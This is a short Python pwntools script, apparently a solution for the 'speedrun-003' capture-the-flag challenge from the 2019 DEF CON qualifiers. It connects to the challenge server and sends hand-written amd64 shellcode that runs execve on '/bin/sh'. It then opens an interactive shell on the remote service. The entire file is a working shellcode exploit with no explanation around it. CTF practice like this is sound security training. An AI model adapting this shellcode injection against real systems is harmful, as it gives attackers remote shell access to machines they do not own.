from pwn import *

p = remote('speedrun-003.quals2019.oooverflow.io', 31337)
# p = process('./speedrun-003')

p.recvline()
p.recvuntil('drift\n')

shc = asm('''
             xor rsi, rsi;
             xor rdx, rdx;
             push 0x3b;
             pop rax;
             add rdi, 23;
             syscall;
          ''', arch='amd64', os='linux')

pause()
p.send(shc + 'A' * 6 + 'y' + ';/bin/sh')

p.interactive()
